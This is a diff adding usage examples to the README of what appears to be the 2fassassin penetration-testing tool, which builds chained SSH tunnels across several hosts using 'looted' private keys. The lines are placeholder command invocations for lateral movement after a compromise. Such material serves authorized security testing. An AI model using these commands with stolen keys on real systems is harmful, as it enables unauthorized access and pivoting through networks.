@@ -86,6 +86,12 @@ root@kali:~/2fassassin#
 - Find out What accounts can potentially be accessed by a specific user
 ./assassin.py --log  account --host <ip_address>
 
+- Create ssh tunnel using looted private keys (greater the chain value, longer the ssh tunnel)
+./assassin.py --tunnel ssh --chain 1 --user <username> --secret password --user2 <username> --host <server_ip>
+./assassin.py --tunnel ssh --chain 2 --user <username> --secret password --user2 <username2> --host <server_ip> --user3 <username3> --host2 <server_ip2> 
+./assassin.py --tunnel ssh --chain 3 --user <username> --secret password --user2 <username2> --host <server_ip> --user3 <username3> --host2 <server_ip2> --user4 <username4> --host3 <server_ip3>
+
+
 
 
 ## Limitations ##
